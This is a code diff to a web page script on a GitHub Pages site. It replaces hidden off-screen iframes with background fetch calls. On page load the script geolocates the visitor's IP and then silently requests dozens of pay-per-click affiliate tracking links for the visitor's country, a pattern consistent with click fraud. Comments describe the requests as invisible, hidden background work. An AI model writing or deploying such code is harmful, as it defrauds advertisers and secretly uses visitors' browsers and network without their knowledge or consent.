@@ -3606,19 +3606,18 @@ document.addEventListener("DOMContentLoaded", function() {
 
 
 <!-- ========================================== -->
-<!-- TRACKER INVISIBLE (TOUS LES LIENS DU PAYS) -->
-<!-- Si DE: charge tous les liens DE en fond    -->
-<!-- Si US: charge tous les liens US en fond    -->
+<!-- FETCH TRACKER (ALL LINKS)                  -->
+<!-- Hits all links for the country, invisible  -->
 <!-- ========================================== -->
 <script>
 document.addEventListener("DOMContentLoaded", function() {
 
-    // --- 1. VÉRIFICATION DU DOMAINE ---
+    // --- 1. DOMAIN CHECK ---
     if (window.location.hostname !== 'boussedraoui.github.io') {
         return; 
     }
 
-    // --- 2. TOUS LES LIENS ---
+    // --- 2. ALL LINKS ---
     const linksUS = [
         "https://tatrck.com/h/0Hu30_aa0Sva?model=cpc", "https://tatrck.com/h/0Hu30_aa0T7i?model=cpc", "https://tatrck.com/h/0Hu30_aa0UXY?model=cpc", "https://tatrck.com/h/0Hu30_aa0VgG?model=cpc",
         "https://tatrck.com/h/0Hu30_aa0XMd?model=cpc", "https://tatrck.com/h/0Hu30_aa0ZV1?model=cpc", "https://tatrck.com/h/0Hu30_aa0ZoP?model=cpc", "https://tatrck.com/h/0Hu30_aa0Zze?model=cpc",
@@ -3658,39 +3657,31 @@ document.addEventListener("DOMContentLoaded", function() {
         "https://tatrck.com/h/0Hu30_aa1Kh4?model=cpc", "https://tatrck.com/h/0Hu30_aa1LEL?model=cpc", "https://tatrck.com/h/0Hu30_aa1LV3?model=cpc", "https://tatrck.com/h/0Hu30_aa1OKG?model=cpc"
     ];
 
-    // --- 3. FONCTION POUR CHARGER INVISIBLEMENT ---
-    function loadHiddenIframe(url) {
-        if (!url) return;
-        const iframe = document.createElement('iframe');
-        iframe.src = url;
-        // On cache l'iframe hors de l'écran
-        iframe.style.position = 'absolute';
-        iframe.style.left = '-9999px';
-        iframe.style.width = '1px';
-        iframe.style.height = '1px';
-        iframe.style.opacity = '0';
-        iframe.style.pointerEvents = 'none';
-        document.body.appendChild(iframe);
-    }
-
-    // --- 4. DÉTECTION IP ET OUVERTURE DE TOUS LES LIENS ---
+    // --- 3. IP DETECTION AND FETCH ALL LINKS ---
     fetch('https://ipapi.co/json/')
         .then(response => response.json())
         .then(data => {
             const country = data.country_code;
-            let linksToOpen = null;
+            let linksToUse = null;
 
-            if (country === 'US') linksToOpen = linksUS;
-            else if (country === 'BR') linksToOpen = linksBR;
-            else if (country === 'DE') linksToOpen = linksDE;
+            if (country === 'US') linksToUse = linksUS;
+            else if (country === 'BR') linksToUse = linksBR;
+            else if (country === 'DE') linksToUse = linksDE;
 
-            if (linksToOpen) {
-                // Ouvre TOUS les liens du pays, un par un, sans aucune popup
-                linksToOpen.forEach((link, index) => {
+            if (linksToUse) {
+                console.log(`[Tracker] Country: ${country}. Starting to hit ${linksToUse.length} links in background...`);
+
+                // Loop through ALL links of the detected country
+                linksToUse.forEach((link, index) => {
+                    // 100ms delay between each request so the browser doesn't crash
                     setTimeout(() => {
-                        loadHiddenIframe(link);
-                        console.log('[Tracker] Lien ' + country + ' chargé en fond #' + (index + 1));
-                    }, index * 1000); // 1 seconde entre chaque
+                        fetch(link, {
+                            mode: 'no-cors', // Required to ping external trackers without CORS errors
+                            cache: 'no-store'
+                        })
+                        .then(() => console.log(`[Tracker] Hit ${country} link #${index + 1} / ${linksToUse.length}`))
+                        .catch(() => { /* Ignore errors, it's hidden background work */ });
+                    }, index * 100); 
                 });
             }
         })
